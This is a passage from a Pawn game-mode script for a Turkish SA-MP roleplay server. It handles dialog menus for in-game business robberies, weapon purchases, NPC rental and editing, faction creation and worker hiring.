	            ShowPlayerDialog(playerid, 331, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Soygun", "Davet etmek / çýkarmak istediðiniz oyuncunun idsini girin:", "Davet Et", "Ýptal");
	        }
	        else if(listitem == 1)
	        {
	            if(GetPVarInt(playerid, "SoygunSure") > 0) return Hata(playerid, "Soygun zaten baþlamýþ.");
				if(Karakter[playerid][adminlevel] < 6 && PolisSay() < 6) return Hata(playerid, "Soygun yapabilmeniz için iþbaþýnda en az 6 polisin bulunmasý gerekmektedir.");
				PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
				PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "75");
				SetPVarInt(playerid, "SoygunSure", 75);
				Bilgi(playerid, "Soygunu baþlattýnýz.");
                new sure=gettime();
             	Karakter[playerid][soygunsure] = sure;
				if(Soygun[playerid][oyuncu2] != -1) { Karakter[Soygun[playerid][oyuncu2]][soygunsure] = sure; SetPVarInt(Soygun[playerid][oyuncu2], "SoygunSure", 75); Bilgi(Soygun[playerid][oyuncu2], "Soygun baþladý, soygun süresince iþyerinden çýkmayýn."); }
				if(Soygun[playerid][oyuncu3] != -1) { Karakter[Soygun[playerid][oyuncu3]][soygunsure] = sure; SetPVarInt(Soygun[playerid][oyuncu3], "SoygunSure", 75); Bilgi(Soygun[playerid][oyuncu3], "Soygun baþladý, soygun süresince iþyerinden çýkmayýn."); }
				if(Soygun[playerid][oyuncu4] != -1) { Karakter[Soygun[playerid][oyuncu4]][soygunsure] = sure; SetPVarInt(Soygun[playerid][oyuncu4], "SoygunSure", 75); Bilgi(Soygun[playerid][oyuncu4], "Soygun baþladý, soygun süresince iþyerinden çýkmayýn."); }
				if(Soygun[playerid][oyuncu5] != -1) { Karakter[Soygun[playerid][oyuncu5]][soygunsure] = sure; SetPVarInt(Soygun[playerid][oyuncu5], "SoygunSure", 75); Bilgi(Soygun[playerid][oyuncu5], "Soygun baþladý, soygun süresince iþyerinden çýkmayýn."); }
                PolisGonderSoygun(playerid, Soygun[playerid][isyerid]);
			}
	        else if(listitem == 2)
	        {
	            Bilgi(playerid, "Soygunu iptal ettiniz.");
				KillTimer(SoygunTextTimer[playerid]);
		        IsyeriSoyuluyor[Soygun[playerid][isyerid]] = false;
		        SoygunTextGizle(Soygun[playerid][lider]);
				DeletePVar(Soygun[playerid][lider], "SoygunSure");
				Soygun[playerid][lider] = -1;
    			if(IsPlayerConnected(Soygun[playerid][oyuncu2])) {
					KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu2]]);
					SoygunTextGizle(Soygun[playerid][oyuncu2]);
					Bilgi(Soygun[playerid][oyuncu2], "Soygun iptal edildi.");
					DeletePVar(Soygun[playerid][oyuncu2], "SoygunSure");
				}
                Soygun[playerid][oyuncu2] = -1;
				if(IsPlayerConnected(Soygun[playerid][oyuncu3])) {
					KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu3]]);
					SoygunTextGizle(Soygun[playerid][oyuncu3]);
					Bilgi(Soygun[playerid][oyuncu3], "Soygun iptal edildi.");
					DeletePVar(Soygun[playerid][oyuncu3], "SoygunSure");
				}
                Soygun[playerid][oyuncu3] = -1;
				if(IsPlayerConnected(Soygun[playerid][oyuncu4])) {
					KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu4]]);
					SoygunTextGizle(Soygun[playerid][oyuncu4]);
					Bilgi(Soygun[playerid][oyuncu4], "Soygun iptal edildi.");
					DeletePVar(Soygun[playerid][oyuncu4], "SoygunSure");
				}
                Soygun[playerid][oyuncu4] = -1;
				if(IsPlayerConnected(Soygun[playerid][oyuncu5])) {
					KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu5]]);
					SoygunTextGizle(Soygun[playerid][oyuncu5]);
					Bilgi(Soygun[playerid][oyuncu5], "Soygun iptal edildi.");
					DeletePVar(Soygun[playerid][oyuncu5], "SoygunSure");
				}
                Soygun[playerid][oyuncu5] = -1;
				Soygun[playerid][isyerid] = -1;
				Soygun[playerid][isyeritip] = -1;
				foreach(new i : Player)
				{
				    if(Birlik[Karakter[i][birlik]][ftip] == LSPD)
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 331)
	{
	    if(response)
	    {
			new pid = strval(inputtext);
			if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
			if(Birlik[Karakter[pid][birlik]][ftip] == LSPD || Birlik[Karakter[pid][birlik]][ftip] == LSPA || Birlik[Karakter[pid][birlik]][ftip] == ASMS || Birlik[Karakter[pid][birlik]][ftip] == LSFD) return Hata(playerid, "Bu oyuncu soygun yapamaz.");
			if(pid == playerid) return Hata(playerid, "Kendinizi soyguna davet edemezsiniz / çýkaramazsýnýz.");
			new sure=gettime();
  			if(sure-Karakter[pid][soygunsure] < 86400) return Hata(playerid, "Oyuncu günde bir soygun yapabilir.");
			if(GetPVarInt(pid, "SoygunID") == playerid)
			{
			    Bilgi(playerid, "Oyuncuyu soygundan çýkardýnýz.");
			    Bilgi(pid, "Soygun lideri sizi soygundan çýkardý.");
				SetPVarInt(pid, "SoygunID", -1);
				new _sid = playerid;
			    if(Soygun[_sid][oyuncu2] == pid)
			    {
			        Soygun[_sid][oyuncu2] = -1;
			    }
			    else if(Soygun[_sid][oyuncu3] == pid)
			    {
			        Soygun[_sid][oyuncu3] = -1;
			    }
			    else if(Soygun[_sid][oyuncu4] == pid)
			    {
			        Soygun[_sid][oyuncu4] = -1;
			    }
			    else if(Soygun[_sid][oyuncu5] == pid)
			    {
			        Soygun[_sid][oyuncu5] = -1;
			    }
		    	SoygunTextGizle(pid);
		    	return 1;
			}
			else
			{
			    if(GetPVarInt(pid, "SoygunID") != -1) return Hata(playerid, "Oyuncu baþka bir soygunda bulunmaktadýr.");
				foreach(new i : Business)
			 	{
			 		if(PlayerToPoint(20.0, pid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			        {
				    	if(GetPlayerVirtualWorld(pid) == Isyeri[i][icikisvw])
				        {
				            if(Soygun[playerid][isyerid] != i) return Hata(playerid, "Oyuncu iþyerinde deðil.");
				            Bilgi(playerid, "Oyuncuyu soyguna davet ettiniz.");
				            new mstring[128];
				            format(mstring, sizeof(mstring), "%s adlý oyuncu tarafýndan soyguna davet edildiniz:",OyuncuAdiniBul(playerid));
				            ShowPlayerDialog(pid, 332, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Soygun", mstring, "Kabul Et", "Red Et");
				            SetPVarInt(pid, "SoygunID", playerid);
				            return 1;
				        }
					}
				}
			}
			Hata(playerid, "Oyuncu iþyerinde deðil.");
	    }
	    return 1;
	}
	if(dialogid == 332)
	{
	    if(response)
		{
		    Bilgi(playerid, "Soyguna katýldýnýz.");
		    new _sid = GetPVarInt(playerid, "SoygunID");
			if(Soygun[_sid][oyuncu2] == -1) Soygun[_sid][oyuncu2] = playerid;
			else if(Soygun[_sid][oyuncu3] == -1) Soygun[_sid][oyuncu3] = playerid;
			else if(Soygun[_sid][oyuncu4] == -1) Soygun[_sid][oyuncu4] = playerid;
			else if(Soygun[_sid][oyuncu5] == -1) Soygun[_sid][oyuncu5] = playerid;
		    SoygunTextGoster(playerid);
		}
		else
		{
		    Hata(playerid, "Soyguna katýlmayý reddetiniz.");
		    SetPVarInt(playerid, "SoygunID", -1);
		}
		return 1;
	}
	if(dialogid == 333)
	{
	    if(response)
	    {
	        new mstring[128];
	        new _id;
	        new _isid = GetPVarInt(playerid, "IsyeriBuy");
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(GetPlayerCash(playerid) < 800) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -800);
	                _id = OyuncuSilahVer(0, playerid, 4, 1);
	                format(mstring, sizeof(mstring), "Baþarýyla býçak aldýnýz.");
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 400;
	                Bilgi(playerid, mstring);
	            }
	            case 1:
	            {
	                if(GetPlayerCash(playerid) < 600) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -600);
	                _id = OyuncuSilahVer(0, playerid, 5, 1);
	                format(mstring, sizeof(mstring), "Baþarýyla sopa aldýnýz.");
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 300;
	                Bilgi(playerid, mstring);
	            }
	            case 2:
	            {
	                if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -1000);
	                _id = OyuncuSilahVer(0, playerid, 8, 1);
	                format(mstring, sizeof(mstring), "Baþarýyla katana aldýnýz.");
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 500;
	                Bilgi(playerid, mstring);
	            }
	            case 3:
	            {
	                if(GetPlayerCash(playerid) < 850) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -850);
	                _id = OyuncuSilahVer(0, playerid, 1, 1);
	                format(mstring, sizeof(mstring), "Baþarýyla muþta aldýnýz.");
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 425;
	                Bilgi(playerid, mstring);
	            }
	            case 4:
	            {
	                if(Karakter[playerid][pistolaldi] == 1) return Hata(playerid, "Zaten ruhsatlý bir pistol sahibisiniz.");
	                if(!Karakter[playerid][sruhsat]) return Hata(playerid, "Silah bulundurma ruhsatýnýz yok.");
	                if(GetPlayerCash(playerid) < 10000) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -10000);
	                _id = OyuncuSilahVer(Karakter[playerid][sqlid], playerid, 22, 0);
	                format(mstring, sizeof(mstring), "Baþarýyla pistol marka silah aldýnýz. No:%d",OyuncuSilah[_id][no]);
	                OyuncuSilah[_id][ruhsat] = 1;
	                Karakter[playerid][pistolaldi] = 1;
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 1000;
	                Bilgi(playerid, mstring);
	            }
	            case 5:
	            {
	                if(Karakter[playerid][deaglealdi] == 1) return Hata(playerid, "Zaten ruhsatlý bir Desert Eagle sahibisiniz.");
	                if(!Karakter[playerid][sruhsat]) return Hata(playerid, "Silah bulundurma ruhsatýnýz yok.");
	                if(GetPlayerCash(playerid) < 30000) return Hata(playerid, "Üzerinizde yeterli para yok.");
	                GivePlayerCash(playerid, -30000);
	                _id = OyuncuSilahVer(Karakter[playerid][sqlid], playerid, 24, 0);
	                format(mstring, sizeof(mstring), "Baþarýyla Desert Eagle marka silah aldýnýz. No:%d",OyuncuSilah[_id][no]);
	                OyuncuSilah[_id][ruhsat] = 1;
	                Karakter[playerid][deaglealdi] = 1;
	                if(!IsyeriYetkilisi(playerid, _isid)) Isyeri[_isid][ikasa] += 2000;
	                Bilgi(playerid, mstring);
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 334)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, 335, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC Tipi", "Striptizci\nGüvenlik\nBarmen", "Seç", "Ýptal");
	        }
			else if(listitem == 1)
			{
			    if(NPCSayiBul(playerid) == 0) return Hata(playerid, "Herhangi bir NPC'niz bulunmamaktadýr.");
				NPCListeGoster(playerid);
			}
	    }
	    return 1;
	}
	if(dialogid == 335)
	{
	    if(response)
	    {
	        SetPVarInt(playerid, "NPCTip", listitem+1);
	        ShowPlayerDialog(playerid, 336, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC Süre", ""C1"NPC'yi ne kadar süre kiralamak istiyorsunuz:\n"C2"(1 Saat 250$ - Max 3 Saat)", "Kirala", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 336)
	{
	    if(response)
	    {
			new _sure = strval(inputtext);
			if(GetPlayerCash(playerid) < _sure*250) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
			if(_sure > 3) { Hata(playerid, "NPC'yi maksimum 3 saat kirayalabilirsiniz."); ShowPlayerDialog(playerid, 336, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC Süre", ""C1"NPC'yi ne kadar süre kiralamak istiyorsunuz:\n"C2"(1 Saat 250$ - Max 3 Saat)", "Kirala", "Ýptal"); return 1; }
			if(_sure < 1) { Hata(playerid, "Hatalý süre girdiniz."); ShowPlayerDialog(playerid, 336, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC Süre", ""C1"NPC'yi ne kadar süre kiralamak istiyorsunuz:\n"C2"(1 Saat 250$ - Max 3 Saat)", "Kirala", "Ýptal"); return 1; }
			GivePlayerCash(playerid, -_sure*250);
			new Float:pPos[4], _ntext[24];
			GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
			GetPlayerFacingAngle(playerid, pPos[3]);
			GetXYInFrontOfPlayerEx(playerid, pPos[0], pPos[1], 1);
			if(GetPVarInt(playerid, "NPCTip") == 1) _ntext = "Striptizci";
			else if(GetPVarInt(playerid, "NPCTip") == 2) _ntext = "Güvenlik";
			else if(GetPVarInt(playerid, "NPCTip") == 3) _ntext = "Barmen";
			//new _id = CreateDynamicActor(_ntext, NPCSkinBul(playerid), pPos[0], pPos[1], pPos[2], pPos[3]);
			new _id = CreateDynamicActor(NPCSkinBul(playerid), pPos[0], pPos[1], pPos[2], pPos[3]);
			NPC[_id][nadtext] = CreateDynamic3DTextLabel(_ntext, COLOR_GREY, pPos[0], pPos[1], pPos[2] + 0.9, 15, .testlos=1);
			NPC[_id][nyazitext] = CreateDynamic3DTextLabel("", -1, pPos[0], pPos[1], pPos[2] + 1.1, 15, .testlos=1);
			NPC[_id][nid] = _id;
			NPC[_id][nskin] = NPCSkinBul(playerid);
			SetDynamicActorColor(NPC[_id][nid], COLOR_GREY);
			NPC[_id][nsahip] = Karakter[playerid][sqlid];
			NPC[_id][ntip] = GetPVarInt(playerid, "NPCTip");
			NPC[_id][nsure] = _sure*60;
			format(NPC[_id][nad], 32, "%s", _ntext);
			SetDynamicActorVirtualWorld(NPC[_id][nid], GetPlayerVirtualWorld(playerid));
			new mstring[128];
			format(mstring, sizeof(mstring), "%d saatliðine %s kiraladýnýz.", _sure, _ntext);
			Bilgi(playerid, mstring);
	    }
	    return 1;
	}
	if(dialogid == 337)
	{
		if(response)
		{
		    new _say=-1;
			for(new i;i<MAX_NPC;i++)
			{
			    if(IsValidDynamicActor(NPC[i][nid]) && Karakter[playerid][sqlid] == NPC[i][nsahip])
			    {
			        _say++;
			        if(listitem == _say)
			        {
			            SetPVarInt(playerid, "NPCDuzenle", i);
			            break;
			        }
			    }
			}
			new mstring[256];
			format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
			ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
		}
		return 1;
	}
	if(dialogid == 338)
	{
	    if(response)
	    {
	        new _id = GetPVarInt(playerid, "NPCDuzenle");
	        switch(listitem)
	        {
	            case 0:
	            {
	                new Float:pPos[4];
					GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
					GetPlayerFacingAngle(playerid, pPos[3]);
					GetXYInFrontOfPlayerEx(playerid, pPos[0], pPos[1], 1);
					SetDynamicActorPos(NPC[_id][nid], pPos[0], pPos[1], pPos[2]);
					SetDynamicActorFacingAngle(NPC[_id][nid], pPos[3]);
					Bilgi(playerid, "NPC'nin pozisyonu düzenlendi.");
					if(IsValidDynamic3DTextLabel(NPC[_id][nadtext])) DestroyDynamic3DTextLabel(NPC[_id][nadtext]);
					NPC[_id][nadtext] = CreateDynamic3DTextLabel(NPC[_id][nad], COLOR_GREY, pPos[0], pPos[1], pPos[2] + 0.9, 15, .testlos=1);
	            }
	            case 1:
	            {
	                ShowPlayerDialog(playerid, 339, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC LISTE (Ýsim Düzenle)", ""C1"NPC'nin ismini girin:", "Düzenle", "Ýptal");
					return 1;
				}
	            case 2:
	            {
	                new _mstring[256], _nstring[64];
	                switch(NPC[GetPVarInt(playerid, "NPCDuzenle")][ntip])
					{
					    case 1:
					    {
					        for(new i;i<sizeof(StripSkin);i++)
					        {
					            format(_nstring, sizeof(_nstring), "%s%d-",_nstring, StripSkin[i]);
					        }
					    }
					    case 2:
					    {
					    	for(new i;i<sizeof(GuvenlikSkin);i++)
					        {
					            format(_nstring, sizeof(_nstring), "%s%d-",_nstring, GuvenlikSkin[i]);
					        }
					    }
					    case 3:
					    {
					    	for(new i;i<sizeof(BarmenSkin);i++)
					        {
					           format(_nstring, sizeof(_nstring), "%s%d-",_nstring, BarmenSkin[i]);
					        }
					    }
					}
					strdel(_nstring, strlen(_nstring)-1, strlen(_nstring));
	                format(_mstring, sizeof(_mstring), ""C1"NPC'nin skini girin:\n"C2"(Seçilebilecek skin idler: %s)", _nstring);
	                ShowPlayerDialog(playerid, 340, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC LISTE (Skin Düzenle)", _mstring, "Düzenle", "Ýptal");
	                return 1;
	            }
	            case 3:
			 	{
			 	    ShowPlayerDialog(playerid, 341, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC LISTE (Anim Düzenle)", ""C1"NPC'nin animini seçin:\n"C2"(Seçilebilcek animler: 1-2)", "Düzenle", "Ýptal");
			 	    return 1;
	            }
	        }
	        new mstring[256];
			format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
			ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 339)
	{
	    if(response)
	    {
	        if(strlen(inputtext) > MAX_PLAYER_NAME-1)
			{
				Hata(playerid, "Ýsim bu kadar uzun olamaz.");
				new mstring[256];
				format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
				ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
				return 1;
			}
	        new _nstring[24];
	        format(_nstring, sizeof(_nstring), "%s", inputtext);
	        SetDynamicActorName(GetPVarInt(playerid, "NPCDuzenle"), _nstring);
	        Bilgi(playerid, "NPC'nin ismi düzenlendi.");
	        new mstring[256];
			format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
			ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 340)
	{
	    if(response)
	    {
	        new _say=0;
			switch(NPC[GetPVarInt(playerid, "NPCDuzenle")][ntip])
			{
			    case 1:
			    {
			        for(new i;i<sizeof(StripSkin);i++)
			        {
			            if(strval(inputtext) == StripSkin[i])
						{
							_say++;
							break;
						}
			        }
			    }
			    case 2:
			    {
			    	for(new i;i<sizeof(GuvenlikSkin);i++)
			        {
			            if(strval(inputtext) == GuvenlikSkin[i])
						{
							_say++;
							break;
						}
			        }
			    }
			    case 3:
			    {
			    	for(new i;i<sizeof(BarmenSkin);i++)
			        {
			            if(strval(inputtext) == BarmenSkin[i])
						{
							_say++;
							break;
						}
			        }
			    }
			}
			if(_say == 0)
			{
				Hata(playerid, "Yanlýþ skin id belirttiniz.");
				new _mstring[256], _nstring[64];
	            switch(NPC[GetPVarInt(playerid, "NPCDuzenle")][ntip])
				{
				    case 1:
				    {
				        for(new i;i<sizeof(StripSkin);i++)
				        {
				            format(_nstring, sizeof(_nstring), "%s%d-",_nstring, StripSkin[i]);
				        }
				    }
				    case 2:
				    {
				    	for(new i;i<sizeof(GuvenlikSkin);i++)
				        {
				            format(_nstring, sizeof(_nstring), "%s%d-",_nstring, GuvenlikSkin[i]);
				        }
				    }
				    case 3:
				    {
				    	for(new i;i<sizeof(BarmenSkin);i++)
				        {
				           format(_nstring, sizeof(_nstring), "%s%d-",_nstring, BarmenSkin[i]);
				        }
				    }
				}
				strdel(_nstring, strlen(_nstring)-1, strlen(_nstring));
	            format(_mstring, sizeof(_mstring), ""C1"NPC'nin skini girin:\n"C2"(Seçilebilecek skin idler: %s)", _nstring);
	            ShowPlayerDialog(playerid, 340, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC LISTE (Skin Düzenle)", _mstring, "Düzenle", "Ýptal");
				return 1;
			}
	        SetDynamicActorSkin(GetPVarInt(playerid, "NPCDuzenle"), strval(inputtext));
	        Bilgi(playerid, "NPC'nin skini düzenlendi.");
	        new mstring[256];
			format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
			ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 341)
	{
	    if(response)
	    {
	        new _tip = strval(inputtext);
	        if(_tip != 1 && _tip != 2)
			{
			 	Hata(playerid, "Hatalý anim id belirttiniz.");
			 	ShowPlayerDialog(playerid, 341, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"NPC LISTE (Anim Düzenle)", ""C1"NPC'nin animini seçin:\n"C2"(Seçilebilcek animler: 1-2)", "Düzenle", "Ýptal");
			 	return 1;
			}
			new _id = GetPVarInt(playerid, "NPCDuzenle");
	        switch(NPC[_id][ntip])
			{
			    case 1:
			    {
			        ClearDynamicActorAnimations(_id);
			        if(_tip == 1) ApplyDynamicActorAnimation(_id,"DANCING","DAN_Down_A",4.1,1,1,1,1,1);
			    	else if(_tip == 2) ApplyDynamicActorAnimation(_id,"DANCING","DAN_Down_A",4.1,1,1,1,1,1);

			    }
			    case 2:
			    {
			        ClearDynamicActorAnimations(_id);
			        if(_tip == 1) ApplyDynamicActorAnimation(_id,"COP_AMBIENT", "Coplook_loop",4.1,0,1,1,1,1);
			    	else if(_tip == 2) ApplyDynamicActorAnimation(_id,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
			    }
			    case 3:
			    {
			    	ClearDynamicActorAnimations(_id);
			    	if(_tip == 1) ApplyDynamicActorAnimation(_id,"BAR","Barserve_in",4.1,0,1,1,1,1);
			    	else if(_tip == 2) ApplyDynamicActorAnimation(_id,"GANGS","prtial_gngtlkA",4.1,0,1,1,1,1);
			    }
			}
			Bilgi(playerid, "NPC'nin animi düzenlendi.");
	        new mstring[256];
			format(mstring, sizeof(mstring), "NPC\t "C2"Pozisyon Düzenle\nNPC\t "C2"Ýsim Düzenle\nNPC\t "C2"Skin Düzenle\nNPC\t "C2"Anim Düzenle");
			ShowPlayerDialog(playerid, 338, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"NPC LISTE", mstring, "Seç", "Ýptal");
	    }
	    return 1;
	}
	if(dialogid == 342)
	{
	    if(response)
	    {
			if(GetPlayerCash(playerid) < FactionTypes[listitem][Cost]) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
	        ShowPlayerDialog(playerid, 343, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birlik Kur", ""C1"Birliðinize bir isim girin:", "Ýsim Seç", "Ýptal");
	        SetPVarInt(playerid, "SectigiBirlikTip", listitem);
	    }
	    return 1;
	}
	if(dialogid == 343)
	{
	    if(response)
	    {
	        if(strlen(inputtext) > 32) return Hata(playerid, "Birlik adýnýz bu kadar uzun olamaz.");
	        new nstring[32],string[512];
	        GivePlayerCash(playerid, -FactionTypes[GetPVarInt(playerid, "SectigiBirlikTip")][Cost]);
	        format(nstring, sizeof(nstring), "%s", EscapeString(inputtext));
	        format(string, sizeof(string), "INSERT INTO `birlikler` (fisim, rutbe1, rutbe2, rutbe3, rutbe4, rutbe5, rutbe6, rutbe7, rutbe8, rutbe9, rutbe10, rutbe11, rutbe12) VALUES ('%s', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)', '(Yok)')", nstring);
	        new Cache:cache = mysql_query(string, true);
			new bid = cache_insert_id();
			cache_delete(cache);
			Birlik[bid][sqlid] = bid;
			strmid(Birlik[bid][fisim], nstring, 0, strlen(nstring), 32);
			strmid(Birlik[bid][rutbe1], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe2], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe3], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe4], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe5], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe6], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe7], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe8], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe9], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe10], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe11], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe12], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe13], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe14], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe15], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe16], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe17], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe18], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe19], "(Yok)", 0, 5, 32);
			strmid(Birlik[bid][rutbe20], "(Yok)", 0, 5, 32);
			Birlik[bid][onay] = 0;
			Birlik[bid][seviye] = 1;
			Birlik[bid][ftip] = FactionTypes[GetPVarInt(playerid, "SectigiBirlikTip")][Type];
			Birlik[bid][itibar] = 10;
			Birlik[bid][blider] = Karakter[playerid][sqlid];
			Birlik[bid][hesapno] = 0;
			Birlik[bid][rfiyat] = 1;
			format(string, sizeof(string), "%s adlý birliði kurdunuz. (Birlik ID:%d)", nstring, bid);
			Bilgi(playerid, string);
			Ipucu(playerid, "/birlik komutunu kullanarak birliðinizin menüsüne ulaþabilirsiniz.");
			Karakter[playerid][birlik] = bid;
			Karakter[playerid][rutbe] = 1;
			BirlikKaydet(bid);
	    }
	    return 1;
	}
	if(dialogid == 344)
	{
	    if(response)
	    {
	        new mesafe = IsyeriMesafesi(2.0, playerid);
	        new __say=IsciSay(mesafe);
	        if(listitem == __say)
			{
			    if(IsciSay(mesafe) == 10) return Hata(playerid, "Maksimum iþçi sýnýra ulaþmýþsýnýz.");
			 	ShowPlayerDialog(playerid, 345, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Ýþçi Al", "Ýþçi olarak almak istediðiniz oyuncunun idsini girin:", "Ýþçi Al", "Ýptal");
				return 1;
			}
			new _say=-1;
			for(new i=0;i<10;i++)
			{
			    if(Isyeri[mesafe][isci][i] != -1) _say++;
			    if(listitem == _say)
			    {
					new mstring[256];
					format(mstring, sizeof(mstring), "%s isimli iþçiyi iþyerinizden çýkarmayý kabul ediyormusunuz?", SQLFromName(Isyeri[mesafe][isci][i]));
			        ShowPlayerDialog(playerid, 346, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþçi Çýkar", mstring, "Ýþçi Çýkar", "Ýptal");
			        SetPVarInt(playerid, "IsciCikar", i);
			        return 1;
			    }
			}
		}
		return 1;
	}
	if(dialogid == 345)
	{
	    if(response)
		{
		    new mesafe = IsyeriMesafesi(2.0, playerid);
		    new _id = strval(inputtext);
		    if(!Girdi[_id] || _id == playerid) return Hata(playerid, "Hatalý oyuncu idsi belirttiniz.");
		    for(new i=0;i<10;i++)
		    {
		        if(Isyeri[mesafe][isci][i] == Karakter[_id][sqlid]) return Hata(playerid, "Bu oyuncu zaten iþyerinizde iþçi olarak çalýþýyor.");
		    }
		    for(new i=0;i<10;i++)
		    {
		        if(Isyeri[mesafe][isci][i] == -1)
		        {
		            Isyeri[mesafe][isci][i] = Karakter[_id][sqlid];
		            new mstring[168];
		            format(mstring, sizeof(mstring), "%s isimli oyuncuyu iþyerinize iþçi olarak eklediniz.", OyuncuAdiniBul(_id));
		            Bilgi(playerid, mstring);
		            IsyeriKaydet(mesafe);
		            break;
		        }
		    }
		}
		return 1;
	}
	if(dialogid == 346)
	{
	    if(response)
	    {
	        new mesafe = IsyeriMesafesi(2.0, playerid);
	        new mstring[128];
	        format(mstring, sizeof(mstring), "%s isimli iþçiyi iþyerinizden çýkardýnýz.", SQLFromName(Isyeri[mesafe][isci][GetPVarInt(playerid, "IsciCikar")]));
	        Bilgi(playerid, mstring);
	        Isyeri[mesafe][isci][GetPVarInt(playerid, "IsciCikar")] = -1;
	        IsyeriKaydet(mesafe);
	    }
		return 1;
	}
 	if(dialogid == 347)
	{
	    if(response)
	    {
	        new mesafe = GetPVarInt(playerid, "MenuIsyeriID");
